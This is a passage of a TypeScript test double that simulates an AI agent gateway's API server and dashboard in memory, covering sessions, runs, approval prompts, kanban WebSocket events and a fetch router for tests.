      if (!token || c.req.header('authorization') !== `Bearer ${token}`) return c.json({ error: 'unauthorized' }, 401);
    }
    // a stopped gateway takes its API server down: only the dashboard answers
    if (via === 'api' && profiles.stopped.has(profile)) return c.json({ error: 'gateway stopped (fake-hermes)' }, 503);

    const key = `${via} ${method} ${path}`;
    const brk = opts.breaks?.[key];
    if (brk?.status) return c.json(brk.body ?? { error: 'broken by fake-hermes' }, brk.status as 404);
    if (brk && 'body' in brk) return c.json(brk.body as object);

    if (via === 'dash' && method === 'GET' && path === '/api/sessions/search') return searchSessions(sim, c.req.query(), deleted);
    if (via === 'dash') {
      const copied = sessionCopies(method, path, body, sim, deleted);
      if (copied) return copied;
    }

    if (via === 'dash') {
      const mon = stores.monitor.handle(method, path, c.req.query());
      if (mon) return c.json(mon.body, mon.status as 200);
      // before skills: /api/learning/node serves memory ids here, skill ids in the skills store
      const mem = stores.memory.handle(method, path, c.req.query(), body);
      if (mem) return c.json(mem.body, mem.status as 200);
      const plug = await stores.plugins.handle(method, path, body);
      if (plug) return c.json(plug.body, plug.status as 200);
    }
    const prof = profiles.handle(via, method, path, body, c.req.query());
    if (prof) return prof;
    const kb = kanban.handle(via, method, path, c.req.query(), body);
    if (kb) return kb;
    const cron = crons.handle(via, method, path, c.req.query(), body, profile);
    if (cron) return cron;
    // before skills: SkillStore answers every /api/actions/{name}/status (404 for unknown actions)
    const conf = config.handle(via, method, path, c.req.query(), body, profile);
    if (conf) return conf;
    const skill = await skills.handle(via, method, path, c.req.query(), body);
    if (skill) return skill;

    if (via === 'api') {
      const simulated = handleRuns(c.req.raw, method, path, body, sim, opts, deleted);
      if (simulated) return simulated;
    }

    const fx = load(opts.fixturesDir, via, method, path);
    if (fx) {
      let out = fx.body;
      if (via === 'dash' && path === '/api/status') out = { ...(out as object), hermes_home: opts.hermesHome ?? '/opt/data' };
      if (via === 'api' && path === '/v1/capabilities' && opts.hide?.capabilities?.length) {
        const caps = structuredClone(out) as { endpoints?: Record<string, unknown> };
        for (const k of opts.hide.capabilities) delete caps.endpoints?.[k];
        out = caps;
      }
      if (via === 'dash' && path === '/openapi.json' && opts.hide?.openapi?.length) {
        const spec = structuredClone(out) as { paths: Record<string, Record<string, unknown>> };
        for (const r of opts.hide.openapi) {
          const [mm, p] = [r.slice(0, r.indexOf(' ')).toLowerCase(), r.slice(r.indexOf(' ') + 1)];
          delete spec.paths[p]?.[mm];
        }
        out = spec;
      }
      return c.json(out as object, fx.status as 200);
    }
    // Writes have no recording: acknowledge them so UI flows can be exercised.
    if (method !== 'GET') return c.json({ ok: true, fake: true });
    return c.json({ error: 'not recorded' }, 404);
  });
  return app;
}

function json(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json; charset=utf-8' } });
}

/**
 * Dashboard `GET /api/sessions/search`: substring (case-insensitive) in titles and messages, snippet of about
 * 40 characters with the hit between `>>>` and `<<<`, like Hermes' FTS5 answer. `panne-recherche` → 500.
 */
function searchSessions(sim: Simulator, query: Record<string, string>, deleted: Set<string>): Response {
  const q = (query.q ?? '').trim().toLowerCase();
  if (!q) return json({ results: [] });
  if (q.includes('panne-recherche')) return json({ detail: 'Search failed' }, 500);
  const limit = Math.min(100, Math.max(1, Number(query.limit ?? 20) || 20));
  const snip = (text: string): string | null => {
    const i = text.toLowerCase().indexOf(q);
    if (i < 0) return null;
    const from = Math.max(0, i - 20);
    const to = i + q.length + 20;
    // like FTS5's snippet(): an ellipsis where the text is cut
    return `${from > 0 ? '...' : ''}${text.slice(from, i)}>>>${text.slice(i, i + q.length)}<<<${text.slice(i + q.length, to)}${to < text.length ? '...' : ''}`;
  };
  const rows: { id: string; session_id: string; source: string | null; title: string | null; snippet: string; last_active: number; message_count: number; profile: string }[] = [];
  const consider = (id: string, source: string | null, title: string | null, msgs: { content: unknown }[], at: number) => {
    if (deleted.has(id)) return;
    if (query.source && source !== query.source) return;
    let snippet: string | null = null;
    for (const msg of msgs) if (!snippet && typeof msg.content === 'string') snippet = snip(msg.content);
    if (!snippet && title) snippet = snip(title);
    if (snippet) rows.push({ id, session_id: id, source, title, snippet, last_active: at, message_count: msgs.length, profile: 'default' });
  };
  for (const [id, list] of sim.messages) consider(id, 'api_server', sim.titles.get(id) ?? null, list, list.at(-1)!.timestamp);
  for (const e of sim.extraSessions.values()) consider(e.id, e.source, e.title, e.messages, e.started_at);
  return json({ results: rows.sort((a, b) => b.last_active - a.last_active).slice(0, limit) });
}

const NOT_FOUND_SESSION = (id: string) => json({ error: { message: `Session not found: ${id}`, code: 'session_not_found' } }, 404);

/** Simulated run and session routes of the API server; null = not handled here. */
/**
 * Dashboard export (`GET /api/sessions/{id}/export`: the row and every message, with their flags) and import
 * (`POST /api/sessions/import`: the id given is kept, an existing one is skipped, a deleted one refused). Imported
 * `api_server` sessions become simulated ones (runs continue them); other sources join the extra sessions.
 */
function sessionCopies(method: string, path: string, body: unknown, sim: Simulator, deleted: Set<string>): Response | null {
  const ex = /^\/api\/sessions\/([^/]+)\/export$/.exec(path);
  if (ex && method === 'GET') {
    const id = decodeURIComponent(ex[1]!);
    const simulated = sim.messages.get(id);
    if (simulated && !deleted.has(id)) {
      return json({
        id, source: 'api_server', title: sim.titles.get(id) ?? null, model: 'fake/model-default', started_at: simulated[0]!.timestamp,
        system_prompt: 'Tu es un agent de test.',
        messages: simulated.map((m) => ({ ...m, message_uid: `uid-${id}-${m.id}`, active: 1, compacted: 0 })),
      });
    }
    const extra = sim.extraSessions.get(id);
    if (!extra || deleted.has(id)) return json({ detail: 'Session not found' }, 404);
    return json({
      id, source: extra.source, title: extra.title, model: null, started_at: extra.started_at,
      messages: extra.messages.map((m, i) => ({ id: i + 1, session_id: id, role: m.role, content: m.content, timestamp: extra.started_at + i, active: 1, compacted: 0 })),
    });
  }
  if (method === 'POST' && path === '/api/sessions/import') {
    const b = (body ?? {}) as { sessions?: unknown; request_id?: unknown; expected_revision?: unknown };
    if (typeof b.request_id !== 'string' || b.expected_revision !== 0 || !Array.isArray(b.sessions)) {
      return json({ detail: 'Invalid session import payload' }, 400);
    }
    const out = { imported_ids: [] as string[], skipped_ids: [] as string[], errors: [] as unknown[] };
    for (const raw of b.sessions as Record<string, unknown>[]) {
      const id = String(raw.id ?? '');
      if (!id) { out.errors.push({ error: 'missing id' }); continue; }
      if (deleted.has(id)) { out.errors.push({ id, error: 'session id retired' }); continue; }
      // like Hermes 0.23: the import is anchored on the id, an existing one is a revision conflict
      if (sim.messages.has(id) || sim.extraSessions.has(id)) return json({ detail: 'revision_conflict' }, 409);
      // the unique title index fails the whole write: Hermes answers it as a storage failure
      if (typeof raw.title === 'string' && sim.titleHolder(raw.title, id)) return json({ detail: 'storage_unavailable' }, 503);
      const started = typeof raw.started_at === 'number' ? raw.started_at : Date.now() / 1000;
      const msgs = (Array.isArray(raw.messages) ? raw.messages : []) as Record<string, unknown>[];
      const source = typeof raw.source === 'string' ? raw.source : 'import';
      if (source === 'api_server' && msgs.length) {
        sim.messages.set(id, msgs.map((m, i) => ({
          id: i + 2, session_id: id, role: String(m.role), content: typeof m.content === 'string' ? m.content : null,
          tool_calls: m.tool_calls ?? null, tool_name: typeof m.tool_name === 'string' ? m.tool_name : null,
          timestamp: typeof m.timestamp === 'number' ? m.timestamp : started + i,
        })));
        if (typeof raw.title === 'string') sim.titles.set(id, raw.title);
      } else {
        sim.extraSessions.set(id, {
          id, source, title: typeof raw.title === 'string' ? raw.title : null, started_at: started,
          messages: msgs.map((m) => ({ role: String(m.role), content: typeof m.content === 'string' ? m.content : '' })),
        });
      }
      out.imported_ids.push(id);
    }
    return json(out);
  }
  return null;
}

function handleRuns(req: Request, method: string, path: string, body: unknown, sim: Simulator, opts: FakeOptions, deleted: Set<string>): Response | null {
  const b = (body ?? {}) as Record<string, unknown>;
  if (method === 'POST' && path === '/v1/runs') {
    sim.runsPosted += 1;
    const sessionId = typeof b.session_id === 'string' ? b.session_id : `fake_session_${sim.runs.size + 1}`;
    // like Hermes: only api_server (and bot_room) sessions take runs
    const extra = sim.extraSessions.get(sessionId);
    if (extra && extra.source !== 'api_server' && extra.source !== 'bot_room') {
      return json({ error: { message: 'Session belongs to another source', code: 'permission_denied' } }, 409);
    }
    const run = sim.create(sessionId, String(b.input ?? ''), String(b.instructions ?? ''),
      typeof b.model === 'string' ? b.model : null, b.model_options ?? null, typeof b.provider === 'string' ? b.provider : null);
    return json({ run_id: run.id, status: 'started', replayed: false });
  }
  let m = /^\/v1\/runs\/([^/]+)(\/[a-z]+)?$/.exec(path);
  if (m) {
    const run = sim.runs.get(decodeURIComponent(m[1]!));
    const sub = m[2];
    if (!run) return json({ error: { message: 'Run not found', code: 'run_not_found' } }, 404);
    if (!sub && method === 'GET') {
      // like Hermes: usage and runtime only on completed runs
      return json({
        object: 'hermes.run', run_id: run.id, status: run.status, session_id: run.sessionId, model: run.model ?? 'fake/model-default',
        created_at: run.createdAt, updated_at: run.updatedAt, output: run.output,
        ...(run.status === 'completed' ? { usage: run.usage, runtime: sim.runtime(run) } : {}),
        // with the gateway authority: the run's generation and the questions waiting for an answer
        ...(sim.controls === 'authority' ? { execution_generation: 1 } : {}),
        ...(run.pendingSteer && TERMINAL.has(run.status) ? { pending_steer: run.pendingSteer } : {}),
        pending_controls: sim.controls === 'authority' ? [run.approval?.prompt, run.clarify?.prompt].filter(Boolean) : [],
      });
    }
    if (sub === '/events' && method === 'GET') {
      const url = new URL(req.url);
      const raw = req.headers.get('last-event-id') ?? url.searchParams.get('last_seq');
      const last = raw === null ? -1 : Math.max(-1, Number.parseInt(raw, 10) || -1);
      return sim.stream(run, last, opts.retainFrom ?? 0);
    }
    if (sub === '/stop' && method === 'POST') {
      sim.stop(run);
      return json({ object: 'hermes.run.stop', run_id: run.id, status: 'stopping' });
    }
    if (sub === '/steer' && method === 'POST') {
      const text = typeof b.input === 'string' ? b.input.trim() : '';
      if (!text) return json({ error: { message: 'input is required', code: 'invalid_request' } }, 400);
      if (!sim.steer(run, text)) return json({ error: { message: `Run is ${run.status}`, code: 'run_not_accepting_steer' } }, 409);
      return json({ object: 'hermes.run.steer', run_id: run.id, accepted: true });
    }
    if (sub === '/clarify' && method === 'POST') {
      // Hermes 0.23: through the session authority only (else not_found, answered 409)
      if (sim.controls !== 'authority') return json({ error: { message: 'not_found', code: 'not_found' } }, 409);
      const keys = Object.keys(b).sort().join(',');
      if (keys !== 'answer,execution_generation,request_id' || typeof b.answer !== 'string') return json({ error: { message: 'invalid_params', code: 'invalid_params' } }, 400);
      if (b.execution_generation !== 1) return json({ error: { message: 'stale_generation', code: 'stale_generation' } }, 409);
      if (!run.clarify || b.request_id !== 'clr_1') return json({ error: { message: 'approval_not_pending', code: 'approval_not_pending' } }, 409);
      run.clarify.resolve(b.answer);
      return json({ run_id: run.id, status: 'resolved', prompt_id: 'clr_1' });
    }
    if (sub === '/approval' && method === 'POST') {
      if (sim.controls === 'authority') {
        // Hermes 0.23 (api_server_authority_runs.respond_run): exactly these three keys, the run's generation
        const keys = Object.keys(b).sort().join(',');
        if (keys !== 'choice,execution_generation,request_id') return json({ error: { message: 'invalid_params', code: 'invalid_params' } }, 400);
        if (b.execution_generation !== 1) return json({ error: { message: 'stale_generation', code: 'stale_generation' } }, 409);
        if (!run.approval || b.request_id !== 'apr_1') return json({ error: { message: 'approval_not_pending', code: 'approval_not_pending' } }, 409);
        if (!(run.approval.prompt.choices as string[]).includes(String(b.choice))) return json({ error: { message: 'invalid_params', code: 'invalid_params' } }, 400);
        const choice = String(b.choice);
        run.approval.resolve(choice);
        return json({ run_id: run.id, status: 'resolved', prompt_id: 'apr_1' });
      }
      if (!run.approval) return json({ error: { message: 'No pending approval', code: 'no_pending_approval' } }, 409);
      const choice = String(b.choice ?? 'deny');
      run.approval.resolve(choice);
      return json({ object: 'hermes.run.approval_response', run_id: run.id, choice, resolved: 1 });
    }
    return null;
  }
  if (method === 'GET' && path === '/api/sessions') {
    const fx = load(opts.fixturesDir, 'api', 'GET', '/api/sessions');
    const recorded = ((fx?.body as { data?: { id: string }[] } | undefined)?.data ?? []).filter((s) => !deleted.has(s.id));
    const simulated = [...sim.messages.entries()]
      .filter(([id]) => !recorded.some((s) => s.id === id))
      .map(([id, list]) => ({ id, source: 'api_server', title: sim.titles.get(id) ?? null, started_at: list[0]!.timestamp, message_count: list.length }));
    const extra = [...sim.extraSessions.values()].map(({ messages, ...e }) => ({ ...e, message_count: messages.length }));
    const url = new URL(req.url);
    const source = url.searchParams.get('source');
    const all = [...simulated, ...extra].sort((a, b) => b.started_at - a.started_at).concat(recorded as never[])
      .filter((s) => !source || (s as { source?: string | null }).source === source);
    const limit = Math.min(200, Number(url.searchParams.get('limit') ?? 50));
    const offset = Number(url.searchParams.get('offset') ?? 0);
    return json({ object: 'list', data: all.slice(offset, offset + limit), limit, offset, has_more: offset + limit < all.length });
  }
  m = /^\/api\/sessions\/([^/]+)(\/messages)?$/.exec(path);
  if (m) {
    const id = decodeURIComponent(m[1]!);
    const simulated = sim.messages.get(id);
    if (deleted.has(id)) return NOT_FOUND_SESSION(id);
    if (m[2] && method === 'GET' && !simulated && sim.extraSessions.has(id)) {
      const extra = sim.extraSessions.get(id)!;
      const data = extra.messages.map((msg, i) => ({
        id: i + 1, session_id: id, role: msg.role, content: msg.content, tool_calls: null, tool_name: null, timestamp: extra.started_at + i,
      })).reverse();
      return json({ object: 'list', session_id: id, data, pagination: { limit: 500, offset: 0, order: 'latest', returned: data.length } });
    }
    if (m[2] && method === 'GET') {
      if (!simulated) return id === 'intendia-probe-1' ? null : NOT_FOUND_SESSION(id);
      return json({
        object: 'list', session_id: sim.liveAlias.get(id) ?? id,
        data: [{ id: 1, session_id: id, role: 'session_meta', content: null, tool_calls: null, tool_name: null, timestamp: simulated[0]!.timestamp }, ...simulated].reverse(),
        pagination: { limit: 500, offset: 0, order: 'latest', returned: simulated.length + 1 },
      });
    }
    if (!m[2] && (method === 'PATCH' || method === 'DELETE')) {
      if (!simulated && id !== 'intendia-probe-1') return NOT_FOUND_SESSION(id);
      if (method === 'DELETE') {
        deleted.add(id);
        sim.messages.delete(id);
        sim.titles.delete(id);
        return json({ object: 'hermes.session.deleted', id, deleted: true });
      }
      if (typeof b.title === 'string') {
        const holder = sim.titleHolder(b.title, id);
        if (holder) return json({ error: { message: `Title '${b.title}' is already in use by session ${holder}`, type: 'invalid_request_error', param: null, code: 'invalid_title' } }, 400);
        sim.titles.set(id, b.title);
      }
      return json({ object: 'hermes.session', session: { id, ...b } });
    }
    if (!m[2] && method === 'GET' && simulated) {
      return json({ object: 'hermes.session', session: {
        id, source: 'api_server', title: sim.titles.get(id) ?? null, started_at: simulated[0]!.timestamp, message_count: simulated.length,
        estimated_cost_usd: sim.costs.get(id) ?? null, actual_cost_usd: null,
      } });
    }
    return null;
  }
  return null;
}

export function createFakeHermes(opts: FakeOptions) {
  const files = new FilesStore(opts.filesRoot ?? mkdtempSync(join(tmpdir(), 'fake-hermes-files-')));
  files.delayMs = opts.filesDelayMs ?? 0;
  const sim = new Simulator(opts.stepMs ?? 5, files.root);
  sim.controls = opts.controls ?? 'authority';
  const crons = new CronStore(opts.cronStepMs ?? opts.stepMs ?? 5, sim);
  const skills = new SkillStore(opts.fixturesDir, opts.skillStepMs ?? opts.stepMs ?? 5);
  const config = new ConfigStore(opts.fixturesDir, opts.configStepMs ?? opts.stepMs ?? 5, opts.terminalBackend);
  const profiles = new ProfileStore(opts.fixturesDir, opts.configStepMs ?? opts.stepMs ?? 5);
  const kanban = new KanbanStore(opts.fixturesDir, opts.kanbanStepMs ?? opts.stepMs ?? 5, () => profiles.names(), files.root);
  const git = new GitStore(opts.git);
  const monitor = new MonitorStore(opts.monitor);
  // learned skills of the graph: the first four of the list (used) and every skill written by the agent
  const memory = new MemoryStore(() => [
    ...skills.skills.slice(0, 4).map((s, i) => ({ name: s.name, category: s.category || 'general', useCount: 4 - i, createdBy: 'bundled', pinned: i === 0 })),
    ...skills.skills.filter((s) => s.provenance === 'agent').map((s) => ({ name: s.name, category: s.category || 'general', useCount: 0, createdBy: 'agent', pinned: false })),
  ]);
  const plugins = new PluginStore(opts.pluginInstallMs);
  const stores: Stores = { crons, skills, config, profiles, kanban, files, git, monitor, memory, plugins };
  const requests: LoggedRequest[] = [];
  return {
    api: makeApp('api', opts, sim, stores, requests), dash: makeApp('dash', opts, sim, stores, requests),
    requests, sim, crons, skills, config, profiles, kanban, files, git, monitor, memory,
    /** Can be switched at run time by tests. */
    kanbanWs: opts.kanbanWs ?? true,
    /** Can be switched at run time by tests. */
    sessionStats: opts.sessionStats ?? false,
    /** Can be switched at run time by tests. */
    oneshot: opts.oneshot ?? 'ok',
  };
}

type Fake = ReturnType<typeof createFakeHermes>;

/** Like Hermes 0.23.0, a wrong token gets no answer to its handshake (neither open nor close). */
export function kanbanWsTokenOk(url: string): boolean {
  return new URL(url, 'ws://fake-dash').searchParams.get('token') === FAKE_DASH_TOKEN;
}

/**
 * One connection to `/api/plugins/kanban/events?board=&since=&token=` (token already checked with
 * `kanbanWsTokenOk`), whatever the transport: `{events, cursor}` messages for the board; unknown board or
 * `kanbanWs: false` → close 1008. Returns the function that ends the subscription.
 */
export function connectKanbanEvents(fake: Fake, url: string, io: { send: (text: string) => void; close: (code: number) => void }): () => void {
  const u = new URL(url, 'ws://fake-dash');
  const board = u.searchParams.get('board') ?? 'default';
  if (!fake.kanbanWs || u.pathname !== '/api/plugins/kanban/events' || !kanbanWsTokenOk(url)
    || !fake.kanban.boards.get(board) || fake.kanban.boards.get(board)!.archived) {
    io.close(1008);
    return () => {};
  }
  const since = u.searchParams.get('since');
  let cursor = since && /^\d+$/.test(since) ? Number(since) : fake.kanban.latestEvent(board);
  return fake.kanban.subscribe((b) => {
    if (b !== board) return;
    const events = fake.kanban.eventsSince(board, cursor);
    if (!events.length) return;
    cursor = events.at(-1)!.id;
    io.send(JSON.stringify({ events, cursor }));
  });
}

/** Fixed figures of `session.stats` (a session of 12 345 tokens out of 200 000, plan used at 42 %). */
export const FAKE_SESSION_STATS = {
  context_tokens: 12_345, context_length: 200_000, tokens_per_s: 41.5,
  plan_gauge: { label: 'Plan Pro', used_bp: 4200, resets_at_ms: Date.UTC(2026, 10, 12, 6) },
};

/**
 * One connection to the dashboard JSON-RPC WebSocket `/api/ws?token=` (token already checked): answers
 * `session.stats` (with `sessionStats`) and `commands.catalog`; any other method, or `session.stats` on a standalone
 * dashboard, gets -32601. Pushes an `event` frame first, like the gateway. Returns the handler of incoming frames.
 */
export function connectGatewaySocket(fake: Fake, io: { send: (text: string) => void }): (text: string) => void {
  io.send(JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready' } }));
  return (text) => {
    let msg: { id?: unknown; method?: unknown; params?: { session_id?: unknown; instructions?: unknown; input?: unknown; template?: unknown; variables?: unknown } };
    try { msg = JSON.parse(text) as typeof msg; } catch { return; }
    const reply = (body: Record<string, unknown>) => io.send(JSON.stringify({ jsonrpc: '2.0', id: msg.id ?? null, ...body }));
    if (msg.method === 'session.stats' && fake.sessionStats) {
      if (msg.params?.session_id === 'intendia-probe') return reply({ error: { code: 4001, message: 'session not found' } });
      return reply({ result: FAKE_SESSION_STATS });
    }
    if (msg.method === 'commands.catalog') return reply({ result: { commands: [] } });
    if (msg.method === 'llm.oneshot' && fake.oneshot !== 'off') {
      const template = typeof msg.params?.template === 'string' ? msg.params.template : '';
      if (template) {
        if (template !== 'commit_message') return reply({ error: { code: 4031, message: `unknown one-shot template: ${template}` } });
        if (fake.oneshot === 'no_model') return reply({ error: { code: 5030, message: 'one-shot generation failed: No LLM provider configured' } });
        const vars = (msg.params?.variables ?? {}) as { diff?: string; avoid?: string };
        const file = /^diff --git a\/(\S+)/m.exec(vars.diff ?? '')?.[1] ?? 'fichiers';
        return reply({ result: { text: vars.avoid ? `chore: retouche ${file}` : `feat: modifie ${file}` } });
      }
      const input = typeof msg.params?.input === 'string' ? msg.params.input : '';
      if (!input || typeof msg.params?.instructions !== 'string') return reply({ error: { code: 4030, message: 'llm.oneshot requires a template or instructions/input' } });
      if (fake.oneshot === 'no_model') return reply({ error: { code: 5030, message: 'one-shot generation failed: No LLM provider configured for task=title_generation' } });
      // first words of the first message, between quotes and with a final dot (cleaned by Intendia)
      const first = input.split('\n').find((l) => l.trim() && !/^(Utilisateur|Agent)\s*:\s*$/.test(l))?.replace(/^(Utilisateur|Agent)\s*:\s*/, '') ?? 'Session';
      return reply({ result: { text: `« ${first.split(/\s+/).slice(0, 5).join(' ')}. »\nAutre ligne` } });
    }
    return reply({ error: { code: -32601, message: `unknown method: ${String(msg.method)}` } });
  };
}

/** WebSocket-like factory for tests (same shape as the server's `WsFactory`), backed by `connectKanbanEvents`. */
export function fakeWebSocketFactory(fake: Fake) {
  return (url: string) => {
    const listeners = new Map<string, ((ev: { data?: unknown; code?: number }) => void)[]>();
    const fire = (type: string, ev: { data?: unknown; code?: number } = {}) => { for (const l of listeners.get(type) ?? []) l(ev); };
    let open = true;
    let stop = () => {};
    let onText: ((text: string) => void) | null = null;
    const end = (code: number) => {
      if (!open) return;
      open = false;
      stop();
      fire('close', { code });
    };
    queueMicrotask(() => {
      if (!kanbanWsTokenOk(url)) return; // handshake left unanswered
      fire('open');
      const io = { send: (data: string) => { if (open) fire('message', { data }); }, close: end };
      if (new URL(url, 'ws://fake-dash').pathname === '/api/ws') onText = connectGatewaySocket(fake, io);
      else stop = connectKanbanEvents(fake, url, io);
    });
    return {
      addEventListener(type: string, l: (ev: { data?: unknown; code?: number }) => void) {
        listeners.set(type, [...(listeners.get(type) ?? []), l]);
      },
      close: (code = 1000) => end(code),
      send: (text: string) => { if (open) queueMicrotask(() => onText?.(text)); },
      /** test helper: is the connection still open? */
      get isOpen() { return open; },
    };
  };
}

/**
 * fetch implementation routing http://fake-api/... and http://fake-dash/... to the in-memory apps
 * (no sockets, for tests).
 */
export function fakeFetch(fake: ReturnType<typeof createFakeHermes>, hosts = { api: 'fake-api', dash: 'fake-dash' }) {
  return async (input: string, init: RequestInit): Promise<Response> => {
    const url = new URL(input);
    const app = url.hostname === hosts.api ? fake.api : url.hostname === hosts.dash ? fake.dash : null;
    if (!app) throw new TypeError(`fetch failed: unknown host ${url.hostname}`);
    const signal = init.signal;
    if (signal?.aborted) throw signal.reason ?? new DOMException('aborted', 'AbortError');
    const answer = Promise.resolve(app.fetch(new Request(url, init)));
    if (!signal) return answer;
    // like fetch: an abort (timeout) before the answer rejects, the late answer is dropped
    return new Promise<Response>((resolve, reject) => {
      const onAbort = () => reject(signal.reason ?? new DOMException('aborted', 'AbortError'));
      signal.addEventListener('abort', onAbort, { once: true });
      answer.then((r) => { signal.removeEventListener('abort', onAbort); resolve(r); }, reject);
    });
  };
}
